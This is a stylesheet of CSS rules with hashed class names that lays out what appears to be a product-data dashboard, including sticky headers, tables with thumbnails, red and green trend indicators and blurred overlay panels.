    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3QNLTq2oGc_Fmcx8YUD8S9 {
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3QNLTq2oGc_Fmcx8YUD8S9 ._2tlS1e2gBsAfFhKSF6aKOu {
        display: inline-flex;
        align-items: center
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3QNLTq2oGc_Fmcx8YUD8S9 ._2tlS1e2gBsAfFhKSF6aKOu ._2fN8c8iPXeQJ5Sbro8xzSs {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3QNLTq2oGc_Fmcx8YUD8S9:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px;
        border-bottom: 1px solid #e2e4e5
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._2qfs8t3FZQ-iC-p_RzID6S {
        display: flex;
        margin-bottom: 10px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._2qfs8t3FZQ-iC-p_RzID6S ._1aw7PCY073iF31-29xRYbL {
        display: inline-flex
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._2qfs8t3FZQ-iC-p_RzID6S ._32bGdKZlsFvef-1kDPO8K2 {
        display: inline-flex;
        margin-left: 30px;
        cursor: pointer;
        color: #006fe3
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1-B0n-UqTfBghgTL2RGyfk {
        position: relative
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1-B0n-UqTfBghgTL2RGyfk ._1xLaNdasZdyueZyni7bMqN {
        position: absolute;
        top: 0;
        left: -20px;
        right: -20px;
        bottom: 0;
        border-radius: 0 0 6px 6px;
        overflow: hidden;
        z-index: 999999
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej {
        position: sticky;
        top: 0;
        padding-top: 20px;
        display: grid;
        grid-template-columns: 0.75fr 70px 1fr;
        padding-bottom: 10px;
        background: #fff;
        border-bottom: 1px solid #e2e4e5;
        z-index: 1000
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._2UYlY6tj6A7yC-2MYU7wnv {
        display: grid;
        grid-template-columns: 68px 1fr
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._2UYlY6tj6A7yC-2MYU7wnv .T1vdgql0U9kpR-Ep-4Ney {
        width: 68px;
        height: 68px;
        margin-right: 10px;
        display: flex;
        border-radius: 4px;
        overflow: hidden
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._2UYlY6tj6A7yC-2MYU7wnv .T1vdgql0U9kpR-Ep-4Ney img {
        max-width: 100%;
        width: 100%
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._2UYlY6tj6A7yC-2MYU7wnv ._26-o9IxkMC0CFqT9TTiK5z {
        padding-left: 10px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._2UYlY6tj6A7yC-2MYU7wnv ._26-o9IxkMC0CFqT9TTiK5z ._1Tj-OnYVrdSDuGpn4a66Qw {
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._2UYlY6tj6A7yC-2MYU7wnv ._26-o9IxkMC0CFqT9TTiK5z ._1Tj-OnYVrdSDuGpn4a66Qw:hover {
        color: var(--ah-primary-hover)
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._2UYlY6tj6A7yC-2MYU7wnv ._26-o9IxkMC0CFqT9TTiK5z .N_qQQa-De7YM71lAR51uc {
        display: flex;
        align-items: center;
        margin-top: 5px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._2UYlY6tj6A7yC-2MYU7wnv ._26-o9IxkMC0CFqT9TTiK5z .N_qQQa-De7YM71lAR51uc span {
        display: inline-flex
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._3hsZN3OlrbPoVqzX6iIaD1 {
        display: grid;
        grid-template-columns: 100px 100px 100px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._3hsZN3OlrbPoVqzX6iIaD1 ._2maEu0jmQfVQPMCqaHE542 {
        color: #2e2e2e
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._3h28hr_Z5dLQUJ2wE2pdej ._3hsZN3OlrbPoVqzX6iIaD1 ._24gsCbW4bJE5HVcIw59xux {
        font-size: 14px;
        font-weight: 700;
        color: #2e2e2e
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._27QSfQdwPHAsAMJrH-DXYD {
        position: relative;
        padding-top: 20px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 {
        display: table;
        width: 100%
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD {
        display: table-header-group
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD .T2T-ViiuGTRRVPM3UIdws {
        display: table-row
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD .T2T-ViiuGTRRVPM3UIdws ._2t-ikb0gUHIPHGjApDwGRs {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD .T2T-ViiuGTRRVPM3UIdws ._2t-ikb0gUHIPHGjApDwGRs._2sgBGI562zj1SxjctPrGq- {
        width: 40%
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD .T2T-ViiuGTRRVPM3UIdws ._2t-ikb0gUHIPHGjApDwGRs._3dM-h0M1lQPzieZH9_6r3F {
        width: 15%
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD .T2T-ViiuGTRRVPM3UIdws ._2t-ikb0gUHIPHGjApDwGRs._22PDaagywhik_rVcDsho3R {
        width: 15%
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD .T2T-ViiuGTRRVPM3UIdws ._2t-ikb0gUHIPHGjApDwGRs.HjKCetAgPnaf4Wwyn6Ddu {
        width: 15%
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD .T2T-ViiuGTRRVPM3UIdws ._2t-ikb0gUHIPHGjApDwGRs._2ThVv38JlRiSgTZZ98Xa27 {
        width: 15%
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD .T2T-ViiuGTRRVPM3UIdws ._2t-ikb0gUHIPHGjApDwGRs:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._3h6PdRHHkVxibRy9894IHD .T2T-ViiuGTRRVPM3UIdws ._2t-ikb0gUHIPHGjApDwGRs:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 {
        display: table-header-group
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws {
        display: table-row
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf.EB_ok9OYXQSAdbk9WW1pU * {
        cursor: pointer
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._1hJPeEJLJcAbb0vuoJtYne {
        width: 60px;
        height: 60px;
        border-radius: 4px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._1Tj-OnYVrdSDuGpn4a66Qw {
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        margin-left: 16px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._1Tj-OnYVrdSDuGpn4a66Qw:hover {
        color: var(--ah-primary-hover)
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._3Jb80JHTN5pwGd73AmGibf {
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf._115n9mrpyFASEiBBdh0lJM>span {
        display: flex;
        align-items: center
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf._115n9mrpyFASEiBBdh0lJM>span span {
        display: inline-flex;
        margin-right: 5px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._1CHgvaurWDV8J-hEOD_fa7,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._8YjcmDVW6E2PoTH7S1Bnw {
        color: #21a67a;
        display: flex;
        align-items: center
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._1CHgvaurWDV8J-hEOD_fa7 svg,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._8YjcmDVW6E2PoTH7S1Bnw svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._1CHgvaurWDV8J-hEOD_fa7 svg,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._1CHgvaurWDV8J-hEOD_fa7 path,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._8YjcmDVW6E2PoTH7S1Bnw svg,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._8YjcmDVW6E2PoTH7S1Bnw path {
        fill: #21a67a
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._39AsK_DxIA1dFDHTgtqW1j,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._3c9Yl2PK0R01t-1UzA7x79 {
        color: #e9162b;
        display: flex;
        align-items: center
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._39AsK_DxIA1dFDHTgtqW1j svg,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._3c9Yl2PK0R01t-1UzA7x79 svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._39AsK_DxIA1dFDHTgtqW1j svg,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._39AsK_DxIA1dFDHTgtqW1j path,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._3c9Yl2PK0R01t-1UzA7x79 svg,
    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1RXj7xEKRnwbflZ_QqfbY5 ._1qSVoYbpre9yFs0NH4Jvq4 .T2T-ViiuGTRRVPM3UIdws ._1W5hBmhZIhJPmqJ7RnwYkf ._3c9Yl2PK0R01t-1UzA7x79 path {
        fill: #e9162b
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._2q9dWEEgyoi1lPB_cGzUkP {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1haQy8-_FXbKgvI6tVfGyJ {
        position: absolute;
        top: 0;
        right: -20px;
        bottom: 0;
        left: -20px;
        background: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 0 0 8px 8px;
        z-index: 100
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1haQy8-_FXbKgvI6tVfGyJ ._9aH_cOi_aGaYKRB6RG3Yw {
        display: flex;
        flex-direction: column;
        align-items: center
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1haQy8-_FXbKgvI6tVfGyJ ._9aH_cOi_aGaYKRB6RG3Yw ._2Y6He-VOoJ2yG28F44Fnny {
        font-size: 20px;
        font-weight: 600;
        color: #fff
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1haQy8-_FXbKgvI6tVfGyJ ._9aH_cOi_aGaYKRB6RG3Yw ._3xHJ3_m0OMfCkPfu7O9Rin {
        margin-top: 20px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1haQy8-_FXbKgvI6tVfGyJ ._9aH_cOi_aGaYKRB6RG3Yw ._3Jwm4ryIdJDxz0CteSXsTQ {
        margin-top: 30px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1haQy8-_FXbKgvI6tVfGyJ ._9aH_cOi_aGaYKRB6RG3Yw ._2GXGlfH0Tfm1D1p5Bi4mC- {
        color: #fff;
        margin-top: 10px
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1haQy8-_FXbKgvI6tVfGyJ ._9aH_cOi_aGaYKRB6RG3Yw ._2GXGlfH0Tfm1D1p5Bi4mC- span {
        display: inline-block;
        color: #0080f7
    }

    ._1631Wd8q82xgoAIN3pe2B_._202uxDXcqp5Tc60IIu8OV- ._1VQeccmHZY2WG4nd0qQMwH {
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 70px 0
    }

    .j7vC56Ts0O2B8o_QAq6as {
        position: relative !important;
        min-height: 140px !important;
        overflow: hidden !important
    }

    .j7vC56Ts0O2B8o_QAq6as ._3e0JtKRVSB_MXCicD2I-L4 {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 2;
        background: transparent;
        width: 100%;
        text-align: center;
        padding: 20px 10px;
        display: flex;
        align-items: center
    }

    .j7vC56Ts0O2B8o_QAq6as ._3e0JtKRVSB_MXCicD2I-L4._3cXqCUkZZk7Zc_7O5Hw7nY {
        background: rgba(255, 255, 255, 0.6)
    }

    .j7vC56Ts0O2B8o_QAq6as ._3e0JtKRVSB_MXCicD2I-L4>div {
        text-align: center;
        width: 100%
    }

    .j7vC56Ts0O2B8o_QAq6as ._3e0JtKRVSB_MXCicD2I-L4 .DTgmgPPJyFIdy4aH5Z8Vh {
        font-weight: 600;
        font-size: 14px;
        line-height: 18px;
        color: #262626;
        margin-bottom: 12px;
        text-align: center
    }

    .j7vC56Ts0O2B8o_QAq6as ._3e0JtKRVSB_MXCicD2I-L4 ._2mwXQ0WoGUDyxR78yuhAI_ {
        font-weight: 400;
        font-size: 12px;
        line-height: 18px;
        color: #555555;
        margin-bottom: 16px;
        text-align: center
    }

    .j7vC56Ts0O2B8o_QAq6as ._2oR-yrb5wTAHwhxK4Zn8Kp {
        filter: blur(10px);
        -webkit-filter: blur(10px);
        height: 100%;
        pointer-events: none
    }

    .j7vC56Ts0O2B8o_QAq6as ._2oR-yrb5wTAHwhxK4Zn8Kp>div {
        text-align: center
    }

    .j7vC56Ts0O2B8o_QAq6as ._2oR-yrb5wTAHwhxK4Zn8Kp:after {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(255, 255, 255, 0.5)
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK {
        padding: 0 20px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._3lRaPGR7HvlKm0YTYvA8rs {
        box-shadow: 0px 1px 8px rgba(0, 0, 0, 0.08);
        margin-left: -20px;
        margin-right: -20px;
        padding-left: 20px;
        padding-right: 20px;
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._3lRaPGR7HvlKm0YTYvA8rs ._1J846Rc7FDHyZSEfstCrOT {
        display: inline-flex;
        align-items: center
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._3lRaPGR7HvlKm0YTYvA8rs ._1J846Rc7FDHyZSEfstCrOT ._3a1mJgMfo5pbmH6TY_k_v2 {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._3lRaPGR7HvlKm0YTYvA8rs:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._34bK8uQO_VNhQe09uGbvmb {
        display: flex;
        justify-content: space-between;
        align-items: center
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .rRo3ZUdir7GSNotQOh-RH {
        display: inline-flex;
        justify-content: center;
        padding: 0 16px;
        background: var(--ah-primary);
        color: #fff;
        border-radius: 4px;
        line-height: 38px;
        height: 38px;
        font-size: 14px;
        cursor: pointer;
        min-width: 140px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .rRo3ZUdir7GSNotQOh-RH:hover {
        background: var(--ah-primary-hover)
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._2iSIFhCJe4-BtPtzOdeK4v {
        display: flex;
        font-size: 18px;
        font-weight: 400;
        color: #2e2e2e
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._3FTikjOTzBJtlXzo7U358A {
        display: inline-flex;
        align-items: center;
        padding: 3px 14px;
        border-radius: 30px;
        font-size: 12px;
        margin-bottom: 8px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._3FTikjOTzBJtlXzo7U358A svg {
        margin-right: 6px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq {
        display: grid;
        grid-template-columns: 0.5fr 1fr;
        position: relative;
        padding: 18px 0;
        column-gap: 70px;
        border-radius: 4px;
        border: 1px solid #e9e9e9;
        padding: 18px 20px;
        margin-top: 20px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq ._3BEcz_KgWYK46FsVy3jlu_ {
        position: relative
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq ._3BEcz_KgWYK46FsVy3jlu_:before {
        content: '';
        display: block;
        width: 1px;
        height: calc(100% - 20px);
        position: absolute;
        top: 10px;
        right: -35px;
        background: #e9e9e9
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq ._3BEcz_KgWYK46FsVy3jlu_ ._3b9TjIZ6Yc2872465LErDA {
        font-size: 16px;
        font-weight: 700;
        color: #ff9900;
        text-align: center
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq ._3BEcz_KgWYK46FsVy3jlu_ ._2FimRlNcjMUBjxWxitsmk4 {
        margin-top: 2px;
        font-size: 12px;
        font-weight: 600;
        color: var(--ah-black-200);
        text-align: center
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq ._3BEcz_KgWYK46FsVy3jlu_ ._1ZSL1mRYIkIVhQBuvZ12Ze {
        margin-top: 4px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq ._3BEcz_KgWYK46FsVy3jlu_ ._1ZSL1mRYIkIVhQBuvZ12Ze a {
        font-size: 12px;
        font-weight: 400;
        color: var(--ah-black-200);
        text-align: center;
        text-decoration: underline;
        cursor: pointer
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq .NfTtWfsiDonYE_dcSi3Y6 {
        position: relative;
        display: grid;
        grid-template-columns: 1fr 0.8fr;
        column-gap: 70px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq .NfTtWfsiDonYE_dcSi3Y6 ._2k83dUH7oC76weLGGirJmH {
        display: flex;
        flex-direction: column;
        justify-content: center;
        position: relative
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq .NfTtWfsiDonYE_dcSi3Y6 ._2k83dUH7oC76weLGGirJmH:before {
        content: '';
        display: block;
        width: 1px;
        height: calc(100% - 20px);
        position: absolute;
        top: 10px;
        right: -35px;
        background: #e9e9e9
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq .NfTtWfsiDonYE_dcSi3Y6 ._3AtgKOJ9Ce0pLVlTah2Xph {
        display: flex;
        flex-direction: column;
        justify-content: center
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq ._3qzL7KxkBu_Y0ef2v9MVrv {
        display: flex;
        justify-content: space-between;
        align-items: center
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq ._2PpO60gzPo2iAnH097iRtL {
        color: var(--ah-black-200);
        color: #6d6d6d
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .xh86iJX49eb0detyBAnnq ._19uT1anhLmVgE0_zrnLYAh {
        font-size: 14px;
        color: var(--ah-black-200);
        color: #2e2e2e;
        font-weight: 700
    }

